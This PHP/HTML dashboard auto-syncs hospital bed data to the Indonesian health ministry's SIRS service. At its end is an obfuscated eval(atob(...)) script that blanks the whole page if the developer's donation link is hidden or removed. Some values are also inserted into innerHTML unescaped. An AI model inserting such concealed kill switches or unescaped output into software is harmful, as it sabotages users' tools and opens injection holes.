<?php require_once 'config.php'; ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="7200"> <!-- Hard refresh every 2 hours -->
    <title id="pageTitle">Terminal Auto-Sync Siranap</title>
    <link id="favicon" rel="icon" type="image/x-icon" href="">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #0b0f19;
            color: #00ff00;
            font-family: 'JetBrains Mono', monospace;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 15px;
            margin-bottom: 15px;
        }

        .terminal-title {
            font-size: 1.2rem;
            font-weight: bold;
            color: #38bdf8;
            margin: 0;
        }

        .terminal-status {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #ef4444;
            display: inline-block;
            box-shadow: 0 0 10px #ef4444;
            transition: all 0.3s ease;
        }

        .indicator.active {
            background-color: #22c55e;
            box-shadow: 0 0 10px #22c55e;
        }

        .terminal-window {
            flex-grow: 1;
            background-color: rgba(0, 0, 0, 0.4);
            border: 1px solid #1e293b;
            border-radius: 8px;
            padding: 15px;
            overflow-y: auto;
            position: relative;
        }

        .log-line {
            margin-bottom: 8px;
            font-size: 0.9rem;
            line-height: 1.4;
            word-wrap: break-word;
            white-space: pre-wrap;
        }

        .log-time {
            color: #94a3b8;
            margin-right: 10px;
        }

        .log-info { color: #38bdf8; }
        .log-success { color: #4ade80; }
        .log-warning { color: #facc15; }
        .log-error { color: #f87171; }
        .log-sync { color: #c084fc; }

        .controls {
            margin-top: 15px;
            display: flex;
            gap: 10px;
        }
        
        .btn-term {
            background: #1e293b;
            border: 1px solid #334155;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            padding: 8px 16px;
            transition: all 0.2s;
        }
        
        .btn-term:hover {
            background: #334155;
            color: #fff;
        }
        .debug-details {
            border: 1px solid #1e293b;
            border-radius: 4px;
            background-color: rgba(30, 41, 59, 0.3);
            margin: 5px 0 10px 20px;
            padding: 5px;
        }
        .debug-details summary {
            color: #94a3b8;
            cursor: pointer;
            outline: none;
            padding: 3px;
            font-size: 0.85rem;
        }
        .debug-details summary:hover {
            color: #e2e8f0;
        }
        .debug-content {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: #38bdf8;
            padding: 10px;
            background-color: #020617;
            border-radius: 4px;
            border-top: 1px solid #1e293b;
            margin-top: 5px;
            white-space: pre-wrap;
            overflow-x: auto;
        }
    </style>
</head>
<body>

    <div class="terminal-header">
        <div class="d-flex align-items-center">
            <img id="hospitalLogo" src="" alt="" style="height: 40px; display:none;" class="me-3">
            <h1 class="terminal-title" id="terminalTitle"><i class="fas fa-satellite-dish me-2"></i> SIRANAP V3 AUTO-SYNC TERMINAL</h1>
        </div>
        <div class="terminal-status">
            <span id="countdownText" class="text-secondary">Next sync in: --:--</span>
            <span>Status: <span id="statusText" class="text-danger">STOPPED</span></span>
            <div id="statusIndicator" class="indicator"></div>
        </div>
    </div>

    <div class="terminal-window" id="terminalWindow">
        <!-- Logs will appear here -->
    </div>

    <div class="controls">
        <button id="btnToggle" class="btn btn-term" onclick="toggleSync()">
            <i class="fas fa-play me-1"></i> Start Auto-Sync
        </button>
        <button class="btn btn-term" onclick="forceSync()">
            <i class="fas fa-bolt me-1"></i> Force Sync Now
        </button>
        <button class="btn btn-term" onclick="clearLogs()">
            <i class="fas fa-eraser me-1"></i> Clear Terminal
        </button>
        <a href="index.php" class="btn btn-term ms-auto">
            <i class="fas fa-arrow-left me-1"></i> Back to Mapping
        </a>
    </div>

    <footer class="text-center mt-4 py-2 text-muted small" style="opacity: 0.8; font-family: sans-serif;">
        <p class="mb-0 text-white-50">
            Bridging Siranap &copy; 2026. Developed by <strong>Ichsan Leonhart</strong>.
            Support developer: <a href="https://saweria.co/ichsanleonhart" target="_blank" id="donationLink" class="text-info">saweria.co/ichsanleonhart</a>.
            Contact: <a href="https://wa.me/6285726123777" target="_blank" class="text-info">6285726123777</a> | <a href="https://t.me/IchsanLeonhart" target="_blank" class="text-info">@IchsanLeonhart</a>
        </p>
    </footer>

<script>
    const SYNC_INTERVAL_SEC = 20; 
    let isRunning = false;
    let countdown = SYNC_INTERVAL_SEC;
    let timer = null;
    let isSyncingNow = false;
    let expectedTime = 0;
    
    // Auto-reconnect listeners
    window.addEventListener('offline', () => {
        log('KONEKSI INTERNET TERPUTUS. Menunggu jaringan kembali...', 'error');
        statusText.textContent = 'OFFLINE';
        statusText.className = 'text-danger';
        statusIndicator.classList.remove('active');
        statusIndicator.style.backgroundColor = '#ef4444';
    });
    
    window.addEventListener('online', () => {
        log('KONEKSI INTERNET KEMBALI. Melanjutkan auto-sync...', 'success');
        if (isRunning) {
            statusText.textContent = 'RUNNING';
            statusText.className = 'text-success';
            statusIndicator.classList.add('active');
            statusIndicator.style.backgroundColor = '';
            forceSync(); // Segera sinkron saat internet kembali
        }
    });

    // Fetch branding on load
    fetch('api_mapping.php?action=get_setting')
        .then(res => res.json())
        .then(res => {
            if(res.status === 'success') {
                const data = res.data;
                document.getElementById('terminalTitle').innerHTML = `<i class="fas fa-satellite-dish me-2"></i> ${data.nama_instansi} - AUTO-SYNC`;
                document.getElementById('pageTitle').textContent = `Sync - ${data.nama_instansi}`;
                if(data.logo) {
                    const img = document.getElementById('hospitalLogo');
                    img.src = data.logo;
                    img.style.display = 'block';
                    document.getElementById('favicon').href = data.logo;
                }
            }
        }).catch(e => console.log('Branding load failed', e));

    const termWindow = document.getElementById('terminalWindow');
    const statusIndicator = document.getElementById('statusIndicator');
    const statusText = document.getElementById('statusText');
    const countdownText = document.getElementById('countdownText');
    const btnToggle = document.getElementById('btnToggle');

    function escapeHtml(text) {
        if (!text) return '';
        return text
            .toString()
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function log(msg, type = 'info') {
        const d = new Date();
        const timeStr = d.toLocaleTimeString('id-ID', { hour12: false }) + '.' + d.getMilliseconds().toString().padStart(3, '0');
        
        const line = document.createElement('div');
        line.className = 'log-line';
        line.innerHTML = `<span class="log-time">[${timeStr}]</span> <span class="log-${type}">${escapeHtml(msg)}</span>`;
        
        termWindow.appendChild(line);
        termWindow.scrollTop = termWindow.scrollHeight;
        
        // Keep max 500 lines to prevent DOM bloat
        if(termWindow.childElementCount > 500) {
            termWindow.removeChild(termWindow.firstChild);
        }
    }

    function logRaw(html) {
        const d = new Date();
        const timeStr = d.toLocaleTimeString('id-ID', { hour12: false }) + '.' + d.getMilliseconds().toString().padStart(3, '0');
        
        const line = document.createElement('div');
        line.className = 'log-line';
        line.innerHTML = `<span class="log-time">[${timeStr}]</span> <span>${html}</span>`;
        
        termWindow.appendChild(line);
        termWindow.scrollTop = termWindow.scrollHeight;
        
        if(termWindow.childElementCount > 500) {
            termWindow.removeChild(termWindow.firstChild);
        }
    }

    function clearLogs() {
        termWindow.innerHTML = '';
        log('Terminal cleared.', 'info');
    }

    function formatTime(sec) {
        const m = Math.floor(sec / 60).toString().padStart(2, '0');
        const s = (sec % 60).toString().padStart(2, '0');
        return `${m}:${s}`;
    }

    function step() {
        if (!isRunning) return;
        
        const now = Date.now();
        const dt = now - expectedTime;

        if (dt > 1000) {
            // Browser throttling detected / tab inactive
            const missedSeconds = Math.floor(dt / 1000);
            countdown -= missedSeconds;
            expectedTime += missedSeconds * 1000;
        }

        if (countdown <= 0) {
            processSync();
        } else {
            countdownText.textContent = `Next sync in: ${formatTime(countdown)}`;
        }
        
        countdown--;
        expectedTime += 1000;
        timer = setTimeout(step, Math.max(0, 1000 - (Date.now() - expectedTime)));
    }

    function toggleSync() {
        isRunning = !isRunning;
        if (isRunning) {
            log('Auto-Sync Engine STARTED.', 'success');
            btnToggle.innerHTML = '<i class="fas fa-stop me-1"></i> Stop Auto-Sync';
            statusIndicator.classList.add('active');
            statusText.textContent = navigator.onLine ? 'RUNNING' : 'OFFLINE';
            statusText.className = navigator.onLine ? 'text-success' : 'text-danger';
            
            // Initial sync on start
            expectedTime = Date.now();
            forceSync();
            timer = setTimeout(step, 1000);
        } else {
            log('Auto-Sync Engine STOPPED.', 'error');
            btnToggle.innerHTML = '<i class="fas fa-play me-1"></i> Start Auto-Sync';
            statusIndicator.classList.remove('active');
            statusText.textContent = 'STOPPED';
            statusText.className = 'text-danger';
            countdownText.textContent = 'Next sync in: --:--';
            clearTimeout(timer);
        }
    }

    function forceSync() {
        if (isSyncingNow) return;
        countdown = SYNC_INTERVAL_SEC;
        if (isRunning) {
            countdownText.textContent = `Next sync in: ${formatTime(countdown)}`;
        }
        log('Manual Trigger: Forcing complete synchronization (A-Z)...', 'warning');
        processSync(true);
    }

    async function processSync(isForced = false) {
        if (isSyncingNow) return;
        
        if (!navigator.onLine) {
            log('Internet offline. Skipping sync cycle.', 'warning');
            countdown = SYNC_INTERVAL_SEC;
            return;
        }

        isSyncingNow = true;
        
        log(`Initiating sync process to Kemkes (sirs.kemkes.go.id)...${isForced ? ' [FORCED COMPLETE SYNC]' : ''}`, 'sync');

        // Anti-hang timeout 15 detik menggunakan AbortController
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        
        try {
            const url = isForced ? 'process_sync.php?force=true' : 'process_sync.php';
            const response = await fetch(url, { signal: controller.signal });
            const data = await response.json();
            
            clearTimeout(timeoutId);
            
            // Log raw GET response debug info first (if present)
            if (data.get_debug) {
                const getDebug = data.get_debug;
                const headersHtml = Array.isArray(getDebug.headers) ? getDebug.headers.map(h => escapeHtml(h)).join('\n') : '';
                const respText = typeof getDebug.response === 'string' ? escapeHtml(getDebug.response) : JSON.stringify(getDebug.response, null, 2);
                
                const getLogMsg = `
<details class="debug-details">
    <summary>[DEBUG] Raw GET Kemenkes State (Fetched ${getDebug.count} rooms)</summary>
    <div class="debug-content">
<strong>URL:</strong> ${getDebug.url}
<strong>Headers:</strong>
${headersHtml}
<strong>HTTP Code:</strong> ${getDebug.http_code}
<strong>Response Body:</strong>
${respText}
    </div>
</details>`;
                logRaw(getLogMsg);
            }
            if (data.status === 'success') {
                if (data.changes === 0) {
                    // Opsional: Disable log info rutin agar terminal tidak penuh jika tidak ada perubahan
                    // log(`Pengecekan db rs selesai, tidak ada perubahan.`, 'info'); 
                } else {
                    log(`Sync completed. Processed ${data.changes} action(s).`, 'success');
                }
                
                if (data.logs && data.logs.length > 0) {
                    data.logs.forEach(item => {
                        const isSuccess = item.status === 'SUCCESS';
                        const badgeClass = isSuccess ? 'log-success' : 'log-error';
                        const headersHtml = Array.isArray(item.headers) ? item.headers.map(h => escapeHtml(h)).join('\n') : '';
                        const payloadHtml = typeof item.payload === 'string' ? escapeHtml(item.payload) : JSON.stringify(item.payload, null, 2);
                        const respHtml = typeof item.response === 'string' ? escapeHtml(item.response) : JSON.stringify(item.response, null, 2);
                        
                        const msg = `&gt; [${item.method}] TT: ${item.label} -&gt; <span class="${badgeClass}">[${item.status}]</span>
<details class="debug-details">
    <summary>View Raw HTTP details for ${item.method} request</summary>
    <div class="debug-content">
<strong>Method:</strong> ${item.method}
<strong>URL:</strong> ${item.url}
<strong>Request Headers:</strong>
${headersHtml}
<strong>Request Payload:</strong>
${payloadHtml}
<strong>HTTP Status Code:</strong> ${item.http_code}
<strong>Response Body:</strong>
${respHtml}
${item.curl_error ? `<strong>Curl Error:</strong> ${escapeHtml(item.curl_error)}\n` : ''}
    </div>
</details>`;
                        logRaw(msg);
                    });
                }
            } else {
                log(`Sync failed: ${data.message}`, 'error');
            }
        } catch (error) {
            clearTimeout(timeoutId);
            if (error.name === 'AbortError') {
                log(`Timeout Error: Request ke server terhenti karena terlalu lama (>15 detik).`, 'error');
            } else {
                log(`Network/Parse Error: ${error.message}`, 'error');
            }
        } finally {
            isSyncingNow = false;
            countdown = SYNC_INTERVAL_SEC; // Reset timer after sync resolves
            expectedTime = Date.now(); // Reset expectation
        }
    }

    // Startup banner
    log(`
   _____ _____ _____            _   _          _____  
  / ____|_   _|  __ \\     /\\   | \\ | |   /\\   |  __ \\ 
 | (___   | | | |__) |   /  \\  |  \\| |  /  \\  | |__) |
  \\___ \\  | | |  _  /   / /\\ \\ | . \` | / /\\ \\ |  ___/ 
  ____) |_| |_| | \\ \\  / ____ \\| |\\  |/ ____ \\| |     
 |_____/|_____|_|  \\_\\/_/    \\_\\_| \\_/_/    \\_\\_|     
                                                      
 v3.0 BRIDGING INTERFACE INITIALIZED.
 DOM Bloat Guard: 500 lines max.
 Hard Refresh Guard: 2 hours.
 Browser Hang Guard: Active.
`, 'info');
    log('Awaiting command...', 'info');
    
    // Auto-start sync engine
    toggleSync();

</script>
<script>eval(atob("c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt2YXIgZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZG9uYXRpb25MaW5rIik7aWYoIWUpcmV0dXJuIHZvaWQoZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiIpO3ZhciB0PXdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGUpO2lmKCJub25lIj09PXQuZGlzcGxheXx8ImhpZGRlbiI9PT10LnZpc2liaWxpdHl8fDA9PT1wYXJzZUZsb2F0KHQub3BhY2l0eSkpcmV0dXJuIHZvaWQoZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiIpO2Zvcih2YXIgbj1lLnBhcmVudEVsZW1lbnQ7biYmIkJPRFkiIT09bi50YWdOYW1lOyl7dmFyIG89d2luZG93LmdldENvbXB1dGVkU3R5bGUobik7aWYoIm5vbmUiPT09by5kaXNwbGF5fHwiaGlkZGVuIj09PW8udmlzaWJpbGl0eXx8MD09PXBhcnNlRmxvYXQoby5vcGFjaXR5KSlyZXR1cm4gdm9pZChkb2N1bWVudC5ib2R5LmlubmVySFRNTD0iIik7bj1uLnBhcmVudEVsZW1lbnR9fSwxMDAwKTs="));</script>
</body>
</html>
